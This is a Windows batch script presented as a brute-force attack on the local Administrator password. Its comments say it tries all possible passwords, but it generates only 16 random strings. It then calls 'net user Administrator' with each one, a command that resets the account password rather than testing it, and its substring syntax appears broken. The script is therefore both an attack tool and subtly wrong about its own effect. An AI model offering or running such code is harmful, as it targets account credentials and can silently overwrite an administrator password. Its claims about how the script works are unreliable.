@echo off
setlocal EnableDelayedExpansion

REM Define the characters to use in the password
set CHARS=0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ

REM Define the maximum length of the password
set MAXLEN=16

REM Generate a list of all possible passwords
for /L %%n in (1,1,%MAXLEN%) do (
  set "COMBINATION="
  for /L %%i in (1,1,%%n) do (
    set /a "INDEX=!random! %% 62"
    set "COMBINATION=!COMBINATION!!CHARS:~!INDEX!,1!"
  )
  echo !COMBINATION!>>passwords_to_try.txt
)

REM Try each password in the list
for /F "tokens=*" %%p in (passwords_to_try.txt) do (
  echo Trying password: %%p
  net user Administrator %%p >nul 2>&1
  if not errorlevel 1 (
    echo Password found, this will also be in a text file (found_password.txt): %%p
    echo %%p>>found_password.txt
    goto :done
  )
)

:done
echo Password brute-forcing complete.

REM Delete the passwords_to_try.txt file
del passwords_to_try.txt

pause
